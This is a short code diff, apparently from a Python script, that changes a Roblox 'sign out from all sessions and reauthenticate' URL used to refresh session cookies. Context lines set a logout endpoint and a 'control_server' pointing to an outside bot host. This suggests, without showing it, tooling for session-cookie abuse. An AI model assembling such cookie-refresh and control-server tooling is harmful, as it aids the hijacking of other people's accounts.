@@ -13,7 +13,7 @@ headers = {
     "Content-Type": "application/json"
 }
 
-reauthcookieurl = "https://www.roblox.com/authentication/signoutfromallsessionsandreauthenticate"
+reauthcookieurl = "https://www.roblox.com/authentication/logoutfromallsessionsandreauthenticate"
 xcsrfurl = "https://auth.roblox.com/v2/logout"
 control_server = "http:///bots.bug.tools"
 
